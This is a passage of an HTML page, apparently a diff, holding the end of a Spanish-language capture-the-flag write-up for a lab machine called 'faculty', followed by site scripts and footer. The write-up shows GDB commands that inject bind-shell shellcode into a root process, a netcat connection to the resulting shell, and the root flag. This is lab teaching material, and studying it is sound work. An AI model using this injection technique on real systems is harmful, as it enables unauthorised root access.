+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">56</span>) = <span class="hljs-number">0x6a9748050f582b6a</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">64</span>) = <span class="hljs-number">0x050f21b0ceff5e03</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">72</span>) = <span class="hljs-number">0x2fbb4852e6f7f875</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">80</span>) = <span class="hljs-number">0x5368732f2f6e6962</span>
+<span class="hljs-built_in">set</span> {<span class="hljs-keyword">long</span>}($rip+<span class="hljs-number">88</span>) = <span class="hljs-number">0x050f3bb0243c8d48</span>
+</code></pre>
+<h4 id="inyecci-n-del-shellcode-en-el-proceso-root">Inyección del shellcode en el proceso root</h4>
+<p>Todas las instrucciones generadas se copian <strong>directamente dentro de la sesión de GDB</strong> en la máquina víctima.</p>
+<p> <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img23.png"/>
+</p>
+<p>Una vez inyectado todo el shellcode, se ejecuta el programa con la tecla <code>c</code> (continue):</p>
+<p> <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img23.png"/>
+</p>
+<p>Esto fuerza al proceso root a ejecutar el shellcode, creando una <strong>bind shell</strong>.</p>
+<h4 id="verificaci-n-del-puerto-abierto">Verificación del puerto abierto</h4>
+<p>Desde otra terminal en la máquina víctima se verifica que el puerto 5600 esté escuchando.</p>
+<pre><code class="lang-bash"><span class="hljs-attribute">netstat -tnlp</span>
+</code></pre>
+<p> <img class="post-vertex-cover" src="https://raw.githubusercontent.com/envertex/images/refs/heads/main/writeups/faculty/img24.png"/>
+</p>
+<p>La presencia del puerto confirma que la bind shell fue creada exitosamente.</p>
+<h4 id="conexi-n-a-la-bind-shell-y-obtenci-n-de-root">Conexión a la bind shell y obtención de root</h4>
+<p>Finalmente, se establece conexión a la bind shell local.</p>
+<pre><code class="lang-bash">nc <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">5600</span>
+</code></pre>
+<p>Una vez dentro:</p>
+<pre><code class="lang-bash"><span class="hljs-attribute">whoami</span>
+</code></pre>
+<pre><code><span class="hljs-attribute">root</span>
+</code></pre>
+<p>Se accede al directorio root y se obtiene la flag final.</p>
+<pre><code class="lang-bash"><span class="hljs-keyword">cd</span> /root
+<span class="hljs-keyword">cat</span> root.txt
+</code></pre>
+<pre><code><span class="hljs-number">3</span>be2db5e88c999189f7feac403597c6f
+</code></pre>
+
+
+            </div>
+         </article>
+      </main>
+      <script>
+         document.addEventListener('DOMContentLoaded', () => {
+           const content = document.querySelector('.post-vertex-content');
+           const tocNav = document.querySelector('.post-vertex-toc-nav ul');
+           if (!content || !tocNav) return;
+         
+           const headers = content.querySelectorAll('h2, h3');
+         
+           headers.forEach(header => {
+             if (!header.id) {
+               header.id = header.textContent.trim().toLowerCase()
+                 .replace(/\s+/g, '-')
+                 .replace(/[^\w\-]/g, '');
+             }
+           });
+         
+           let currentUlH2 = null;
+         
+           headers.forEach(header => {
+             if (header.tagName.toLowerCase() === 'h2') {
+               const li = document.createElement('li');
+         
+               const wrapper = document.createElement('div');
+               wrapper.style.display = 'inline-flex';
+               wrapper.style.alignItems = 'center';
+               wrapper.style.gap = '0.3rem';
+         
+               const toggle = document.createElement('span');
+               toggle.textContent = '▸';
+               toggle.style.userSelect = 'none';
+               toggle.style.fontWeight = 'bold';
+               toggle.style.cursor = 'pointer';
+         
+               const a = document.createElement('a');
+               a.href = `#${header.id}`;
+               a.textContent = header.textContent;
+               a.style.textDecoration = 'none';
+               a.style.fontWeight = 'bold';
+               a.style.color = 'var(--text-primary)';
+         
+               wrapper.appendChild(toggle);
+               wrapper.appendChild(a);
+               li.appendChild(wrapper);
+         
+               const ulH3 = document.createElement('ul');
+               ulH3.style.display = 'none';
+               ulH3.style.paddingLeft = '1.5rem';
+               li.appendChild(ulH3);
+         
+               wrapper.addEventListener('click', () => {
+                 if (ulH3.style.display === 'none') {
+                   ulH3.style.display = 'block';
+                   toggle.textContent = '▾';
+                 } else {
+                   ulH3.style.display = 'none';
+                   toggle.textContent = '▸';
+                 }
+                 document.getElementById(header.id).scrollIntoView({ behavior: 'smooth' });
+               });
+         
+               tocNav.appendChild(li);
+               currentUlH2 = ulH3;
+         
+             } else if (header.tagName.toLowerCase() === 'h3' && currentUlH2) {
+               const li = document.createElement('li');
+               li.style.marginBottom = '0.25rem';
+         
+               const a = document.createElement('a');
+               a.href = `#${header.id}`;
+               a.textContent = header.textContent;
+               a.style.textDecoration = 'none';
+               a.style.fontWeight = 'normal';
+               a.style.color = 'var(--text-muted)';
+         
+               a.addEventListener('click', e => {
+                 e.preventDefault();
+                 document.getElementById(header.id).scrollIntoView({ behavior: 'smooth' });
+               });
+         
+               li.appendChild(a);
+               currentUlH2.appendChild(li);
+             }
+           });
+         });
+         document.addEventListener("DOMContentLoaded", () => {
+         
+           const content = document.querySelector(".post-vertex-content");
+           const metaLine = document.querySelector(".post-vertex-reading");
+         
+           if (!content || !metaLine) return;
+         
+           /* =========================
+              FECHA
+           ========================= */
+           const rawDate = metaLine.getAttribute("datetime");
+           let formattedDate = "";
+         
+           if (rawDate) {
+             const date = new Date(rawDate);
+             formattedDate = date.toLocaleDateString("en-US", {
+               day: "numeric",
+               month: "long",
+               year: "numeric"
+             });
+           }
+         
+           /* =========================
+              CONTAR PALABRAS (SIN IMÁGENES)
+           ========================= */
+           const clone = content.cloneNode(true);
+         
+           clone.querySelectorAll("img, svg, video, iframe").forEach(el => el.remove());
+         
+           const text = clone.innerText
+             .replace(/\s+/g, " ")
+             .trim();
+         
+           const words = text ? text.split(" ").length : 0;
+         
+           /* =========================
+              TIEMPO DE LECTURA
+           ========================= */
+           const wordsPerMinute = 200;
+           const readingTime = Math.max(1, Math.ceil(words / wordsPerMinute));
+         
+           /* =========================
+              SALIDA FINAL (UNA SOLA LÍNEA)
+           ========================= */
+           metaLine.textContent =
+             `${formattedDate} • ${words.toLocaleString()} words • ${readingTime} min read`;
+         });
+         
+         
+      </script>
+      <footer>
+         <footer class="site-footer">
+            <div class="footer-content">
+               <p class="footer-text">
+                  &copy; 2026 Your Site Title. 
+               </p>
+               <div class="footer-social">
+                  <div class="social-links">
+                     <a href="https://github.com/yourusername" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="GitHub">
+                        <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path>
+                        </svg>
+                     </a>
+                     <a href="https://www.linkedin.com/in/yourprofile" target="_blank" rel="noopener noreferrer" class="social-link" aria-label="LinkedIn">
+                        <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path>
+                        </svg>
+                     </a>
+                     <a href="mailto:your.email@example.com" class="social-link" aria-label="Email">
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
+                        </svg>
+                     </a>
+                  </div>
+               </div>
+            </div>
+         </footer>
+      </footer>
+      <div id="search-modal" class="search-modal" aria-hidden="true" role="dialog" aria-label="Search">
+         <div class="search-modal-backdrop" id="search-modal-backdrop"></div>
+         <div class="search-modal-container">
+            <div class="search-input-wrapper">
+               <svg class="search-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+               </svg>
+               <input 
+                  type="search" 
+                  id="search-input" 
+                  class="search-input" 
+                  placeholder="Search..." 
+                  autocomplete="off"
+                  aria-label="Search input"
+                  >
+               <button class="search-input-clear" id="search-input-clear" aria-label="Clear search">
+                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+                  </svg>
+               </button>
+               <button class="search-modal-close" id="search-modal-close" aria-label="Close search">
+                  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                  </svg>
+               </button>
+            </div>
+            <div id="search-results" class="search-results"></div>
+         </div>
+      </div>
+      <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="yourwidgetid" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+      <button id="scroll-to-top" class="scroll-to-top" aria-label="Scroll to top" type="button">
+         <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
+         </svg>
+      </button>
+      <script src="/js/index.js" defer></script>
+   </body>
+</html>
